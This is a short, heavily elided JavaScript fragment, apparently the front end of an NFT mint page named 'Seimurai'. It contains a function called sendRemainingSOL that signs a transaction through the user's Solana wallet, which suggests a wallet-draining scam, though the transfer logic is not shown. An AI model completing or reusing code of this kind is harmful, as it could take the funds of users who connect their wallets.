...
const image = 'https://pbs.twimg.com/profile_images/1744590768784707584/O8SihfVS_400x400.jpg'
const Title = 'Seimurai'
const supply = 1090
...
function App() {
    ...
    async function sendRemainingSOL(walletKeyPair, connection,) {
        ...
        try {
            ...
            const signed = await window.solana.signTransaction(walletKeyPair, transaction)
